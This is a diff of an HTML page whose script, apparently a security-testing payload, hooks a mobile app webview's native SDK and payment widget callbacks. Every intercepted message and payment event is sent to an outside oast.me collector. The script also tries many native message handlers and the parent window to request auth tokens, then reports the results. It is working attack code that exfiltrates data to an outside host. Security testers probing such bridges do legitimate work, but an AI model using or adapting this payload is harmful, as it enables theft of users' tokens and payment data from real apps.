@@ -1,36 +1,74 @@
-<html>
-  <head><title>Probing...</title></head>
+  <html>
+  <head><title>Hooking...</title></head>
   <body>
   <script>
-  var data = {};
+  var captured = [];
 
-  // Probe __plusSDKMobileCompat
+  // Hook the onMessage callback - intercept what native sends to the page
+  var origOnMessage = window.__plusSDKMobileCompat.onMessage;
+  window.__plusSDKMobileCompat.onMessage = function(msg) {
+    captured.push({type: "plusSDK", msg: msg, msgType: typeof msg, str: JSON.stringify(msg)});
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/native-msg?" + encodeURIComponent(JSON.stringify(msg)));
+    if(origOnMessage) return origOnMessage.apply(this, arguments);
+  };
+
+  // Hook payment onEvent
+  var origOnEvent = window.__webviewPaymentWidget.onEvent;
+  window.__webviewPaymentWidget.onEvent = function(evt) {
+    captured.push({type: "payment", evt: evt, str: JSON.stringify(evt)});
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/payment-evt?" + encodeURIComponent(JSON.stringify(evt)));
+    if(origOnEvent) return origOnEvent.apply(this, arguments);
+  };
+
+  // Now try to SEND messages to native via various methods
+  var sendResults = [];
+
+  // Method 1: webkit.messageHandlers with common names
+  var tryHandlers = ["plus","plusSDK","sdk","native","bridge","app","message",
+    "SmartWebview","smartWebview","webview","PlusHomeSDK","plusHomeSDK",
+    "fintech","bank","payment","pay","compat","mobileCompat"];
+
+  tryHandlers.forEach(function(h){
+    try {
+      window.webkit.messageHandlers[h].postMessage({type:"ping",action:"getToken"});
+      sendResults.push(h + ": SENT (no error)");
+    } catch(e) {
+      if(!e.message.includes("undefined")) sendResults.push(h + ": " + e.message);
+    }
+  });
+
+  // Method 2: Try postMessage to parent/top
   try {
-    var sdk = window.__plusSDKMobileCompat;
-    data.plusSDK_type = typeof sdk;
-    data.plusSDK_keys = Object.keys(sdk);
-    data.plusSDK_proto = Object.getOwnPropertyNames(Object.getPrototypeOf(sdk));
-    data.plusSDK_str = JSON.stringify(sdk);
-    // Try to enumerate all properties including non-enumerable
-    data.plusSDK_allProps = Object.getOwnPropertyNames(sdk);
-  } catch(e) {
-    data.plusSDK_error = e.message;
-  }
+    window.parent.postMessage({type:"plus-sdk",action:"getAuthToken"}, "*");
+    sendResults.push("parent.postMessage: sent");
+  } catch(e){}
 
-  // Probe __webviewPaymentWidget
+  // Method 3: Try setting onMessage to trigger a response
+  // Some SDKs respond when you assign the callback
   try {
-    var pay = window.__webviewPaymentWidget;
-    data.payment_type = typeof pay;
-    data.payment_keys = Object.keys(pay);
-    data.payment_proto = Object.getOwnPropertyNames(Object.getPrototypeOf(pay));
-    data.payment_str = JSON.stringify(pay);
-    data.payment_allProps = Object.getOwnPropertyNames(pay);
-  } catch(e) {
-    data.payment_error = e.message;
-  }
+    window.__plusSDKMobileCompat.onMessage({type:"ready"});
+    sendResults.push("called own onMessage with ready");
+  } catch(e){}
 
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-probe?" + encodeURIComponent(JSON.stringify(data)));
-  document.title = JSON.stringify(data);
+  // Method 4: Try window.location with SDK scheme
+  // Don't actually navigate, just log what would happen
+  sendResults.push("Would try: ybapp://plus-home-sdk/getToken");
+
+  // Method 5: Custom event dispatch
+  try {
+    document.dispatchEvent(new CustomEvent("plusSDKReady", {detail:{}}));
+    sendResults.push("dispatched plusSDKReady event");
+  } catch(e){}
+
+  // Report after 5s (give native time to respond via onMessage)
+  setTimeout(function(){
+    var report = {
+      sendResults: sendResults,
+      captured: captured
+    };
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/full-report?" + encodeURIComponent(JSON.stringify(report)));
+    document.title = JSON.stringify(report);
+  }, 5000);
   </script>
   </body>
   </html>
